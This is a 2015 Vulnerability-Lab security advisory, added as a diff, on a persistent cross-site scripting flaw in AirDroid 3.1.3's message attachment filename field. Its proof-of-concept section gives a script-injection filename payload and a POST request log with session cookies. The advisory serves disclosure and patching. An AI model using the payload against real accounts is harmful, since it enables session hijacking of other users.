@@ -1,0 +1,173 @@
+Document Title:
+===============
+Airdroid iOS, Android & Win 3.1.3 - Persistent Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1543
+
+
+Release Date:
+=============
+2015-07-20
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1543
+
+
+Common Vulnerability Scoring System:
+====================================
+3.9
+
+
+Product & Service Introduction:
+===============================
+AirDroid allows you to access wirelessly and for free on your Android phone or tablet from Windows, Mac or the Internet, and to control it.
+
+(Copy of the Product Homepage: https://www.airdroid.com/de/ )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Core Research Team discovered an application-side input validation web vulnerability in the official SandStudio AirDroid (windows, ios and android) mobile web-application.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-07-05: Researcher Notification & Coordination (Hadji Samir)
+2015-07-06: Vendor Notification (Security Team)
+2015-07-20: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Sand Studio
+Product: AirDroid iOS Application (Andoird, Windows, MacOS & Web) 3.1.3
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Technical Details & Description:
+================================
+A persistent input validation web vulnerability has been discovered  in the official SandStudio AirDroid (windows, ios and android) mobile web-application.
+The vulnerability allows remote attacker or low privilege user accounts to inject malicious codes to the application-side of the affected mobile web-application.
+
+The vulnerability is located in the send messages and the send message with an attached file  module. Remote attackers with low privilege user account are able to upload file name 
+with malicious strings like ``><script>alert(1).txt. On the arrival inbox occurs the execution of the malicious code that compromises the other target system/device user account.
+The vulnerability is located on the application-side and the request method to inject is POST.
+
+The security risk of the application-side web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.9.
+Exploitation of the application-side web vulnerability requires a low privilege web-application user account and low user interaction.
+Successful exploitation of the vulnerabilities results in persistent phishing mails, session hijacking, persistent external redirect to malicious 
+sources and application-side manipulation of affected or connected module context.
+
+Request Method(s):
+						[+] POST
+
+Vulnerable Module(s):
+						[+] Send Message
+
+Vulnerable Parameter(s):
+						[+] filename
+
+Affected Module(s):
+						[+] Message Inbox
+
+
+Proof of Concept (PoC):
+=======================
+The vulnerability can be exploited by remote attackers with low privilege application user account and low user interaction (click).
+For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
+
+PoC:
+<span class="name">"><"><script>alert(document.cookie).txt< span="">[PERSISTENT INJECTED SCRIPT CODE]
+    <span class="progress-rate">100%</span>
+    <a class="attach-del-icon"></a>
+</scrip...txt<></span>
+
+
+--- PoC Session Logs [POST] ---
+11:13:00.993[0ms][total 0ms] Status: pending[]
+POST https://upload.airdroid.com/sms/attachment/?fn=%22%3E%3Cscript%3Ealert(document.cookie).txt&d=&after=0&rtype=0&origin=http%3A%2F%2Fweb.airdroid.com&country=DZ&fname=%22%3E%3Cscript%3Ealert(document.cookie).txt 
+Load Flags[LOAD_BYPASS_CACHE  ] Content Size[unknown] Mime Type[unknown]
+   Request Headers:
+      Host[upload.airdroid.com]
+      User-Agent[Mozilla/5.0 (X11; Linux i686; rv:39.0) Gecko/20100101 Firefox/39.0]
+      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[en-US,en;q=0.5]
+      Accept-Encoding[gzip, deflate]
+      Content-Type[application/octet-stream]
+      Referer[http://web.airdroid.com/]
+      Content-Length[5281]
+      Origin[http://web.airdroid.com]
+      Cookie[_SESSION=0b484eb230f27c004a7e990bace6175a416b58ed-%00_TS%3A1438769709%00; _ga=GA1.2.1046706455.1436177514; _gat=1; account_sid=c51d21b583ce76c04c8d4fa5a5c7496e; account_info=aW5mby5kaW1hbmV0QGdtYWlsLmNvbQ%3D%3D%2C63b971b729a756a3c1eb0fec6cccb736%2C9731220%2C59fd7af875fa5434a86e5397c79380d2]
+   Post Data:
+      POST_DATA[-PNG
+	  
+Note: We demonstrated the poc by usage of the web-app but the local app is also vulnerable to the same issue!
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerbaility can be patched by a secure parse and encode of the vulnerable filename value in the send message module with the attach file function.
+
+
+Security Risk:
+==============
+The security risk of the application-side input validation web vulnerability in the airdroid app is estimated as medium. (CVSS 3.9)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Hadji Samir [samir@evolution-sec.com]
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 	       		- admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
+Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+				Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
+
+
